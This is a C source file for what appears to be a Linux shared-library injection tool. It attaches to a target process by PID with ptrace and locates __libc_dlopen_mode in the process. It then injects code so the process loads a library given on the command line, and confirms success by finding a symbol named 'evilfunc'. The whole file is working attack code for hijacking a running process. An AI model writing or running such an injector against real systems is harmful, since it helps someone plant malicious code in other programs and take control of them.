#include "elf-parse.h"
#include "utils.h"
#include "cli.h"

int main(int argc, char *argv[])
{
  int pid;
  struct user_regs_struct regz;
  long sym_addr;
  long dlopen_addr;
  ElfW(Sym) * sym;

  print_welcome();

  if (argc < 3) {
    print_usage();
    exit(-1);
  }

  if(open(argv[2], O_RDONLY) < 0) {
    Serror("error: no such file.");
    exit(-1);
  }

  pid = atoi(argv[1]);

  ptrace_attach(pid);
  Xinfo("attached to pid %d.", pid);
  elf_rt_t target;
  set_pid(&target, pid);
  parse_elf(&target);
  print_elf(&target);

  if (!(dlopen_addr = find_symbol(&target, "__libc_dlopen_mode", NULL)))
  {
  Serror("error! couldn't find __libc_dlopen_mode()!");
  exit(-1);
  }

  inject_code(pid, argv[2], dlopen_addr, target.elf.ehdr->e_entry);

  if(!( find_symbol(&target, "evilfunc" , NULL))) {
    Serror("inject failed.");
    exit(-1);
  }
  Sinfo("lib injection done!");
  ptrace_detach(pid);
}